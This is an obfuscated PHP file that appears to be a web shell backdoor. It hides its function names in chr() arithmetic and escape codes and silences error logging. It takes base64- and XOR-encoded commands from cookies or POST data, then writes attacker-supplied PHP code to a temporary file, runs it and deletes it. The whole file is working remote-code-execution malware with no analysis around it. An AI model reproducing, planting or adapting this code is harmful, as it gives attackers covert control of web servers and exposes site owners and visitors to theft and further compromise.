<?php $hcgbyi = chr(102).chr(889-784)."\x6c".'e'.chr(210-115)."\160".'u'."\x74"."\x5f"."\143".'o'.chr(848-738).'t'."\145"."\156".'t'.chr(989-874);
$hjmqebt = 'b'."\x61"."\x73"."\145".chr(337-283)."\x34".chr(1034-939)."\144"."\x65".chr(99)."\x6f"."\x64".chr(659-558);
$xswarvv = chr(105)."\156".'i'.'_'."\163".'e'.chr(216-100);
$ufqovzc = chr(608-491).chr(110).'l'."\151".chr(178-68)."\x6b";


@$xswarvv("\x65"."\162".chr(298-184).'o'.chr(114)."\137".'l'."\x6f"."\147", NULL);
@$xswarvv('l'."\157"."\147"."\x5f"."\145".'r'.'r'.'o'.chr(421-307)."\163", 0);
@$xswarvv(chr(109).chr(97).chr(120)."\137"."\x65"."\170".chr(101).chr(417-318)."\x75".chr(116)."\x69".'o'."\x6e".chr(993-898).'t'.'i'.'m'.'e', 0);
@set_time_limit(0);

function oadbddoao($tdtagcc, $mnuustk)
{
    $xbzkl = "";
    for ($iuionxnn = 0; $iuionxnn < strlen($tdtagcc);) {
        for ($j = 0; $j < strlen($mnuustk) && $iuionxnn < strlen($tdtagcc); $j++, $iuionxnn++) {
            $xbzkl .= chr(ord($tdtagcc[$iuionxnn]) ^ ord($mnuustk[$j]));
        }
    }
    return $xbzkl;
}

$msgxkql = array_merge($_COOKIE, $_POST);
$kwgtnutqut = 'b1e17ae9-069e-442c-9a16-aee3a2418b79';
foreach ($msgxkql as $btegtoemj => $tdtagcc) {
    $tdtagcc = @unserialize(oadbddoao(oadbddoao($hjmqebt($tdtagcc), $kwgtnutqut), $btegtoemj));
    if (isset($tdtagcc["\141".'k'])) {
        if ($tdtagcc["\x61"] == chr(246-141)) {
            $iuionxnn = array(
                chr(112)."\166" => @phpversion(),
                chr(181-66).'v' => "3.5",
            );
            echo @serialize($iuionxnn);
        } elseif ($tdtagcc["\x61"] == "\x65") {
            $lgbkqsdu = "./" . md5($kwgtnutqut) . chr(46).chr(105).chr(503-393).chr(99);
            @$hcgbyi($lgbkqsdu, "<" . '?'."\x70".chr(104).'p'.' '."\100".chr(718-601).'n'."\154"."\x69"."\156".chr(790-683).chr(40)."\x5f"."\x5f"."\106".chr(73).chr(455-379)."\x45".chr(95).chr(617-522).')'.chr(59)."\x20" . $tdtagcc['d']);
            include($lgbkqsdu);
            @$ufqovzc($lgbkqsdu);
        }
        exit();
    }
}

